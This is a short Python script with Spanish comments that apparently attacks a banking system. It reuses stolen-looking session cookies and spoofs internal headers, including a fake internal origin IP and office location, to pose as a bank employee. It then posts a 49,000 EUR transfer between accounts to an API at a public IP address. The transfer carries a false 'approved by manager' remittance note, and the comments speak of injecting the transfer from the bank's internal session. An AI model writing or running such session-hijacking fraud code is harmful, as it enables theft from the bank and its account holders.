import requests

# === Simulamos que ya tenemos las cookies reales del sistema ===
session_cookies = {
    "csrftoken": "OMydIM4fj9wmIEKPe6TZB3GUJVbzJiUK",
    "sessionid": "2a0041c185e0x0x4a37f1aee7a15804"
}

# === Simulamos la transferencia como si ya estuviéramos en el sistema ===
session = requests.Session()
session.cookies.update(session_cookies)

session.headers.update({
    "Host": "80.78.30.242",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0 (InternalBrowser)",
    "Accept": "text/xml,application/xml,application/xhtml+xml,application/json",
    "Accept-Language": "es-ES,es;q=0.9,en;q=0.8",
    "Accept-Encoding": "gzip, deflate, br",
    "X-Origin-IP": "192.168.1.10",
    "X-Location": "OFICINA-CENTRAL-ES",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/json"
})

# === Hacer la transferencia directa ===
transfer_url = "http://80.78.30.242:9181/api/send-transfer"

transfer_data = {
    "payment_id": "dummyuuid123",
    "debtor_account_id": 112233,
    "creditor_account_id": 445566,
    "instructed_amount": 49000.00,
    "currency": "EUR",
    "requested_execution_date": "2025-07-06",
    "remittance_information_unstructured": "Traspaso aprobado por gerente",
    "status": "PDNG",
}

print("[+] Inyectando transferencia desde sesión interna del banco...")

transfer_response = session.post(transfer_url, json=transfer_data)
print("Status transferencia:", transfer_response.status_code)
print("Respuesta:", transfer_response.text)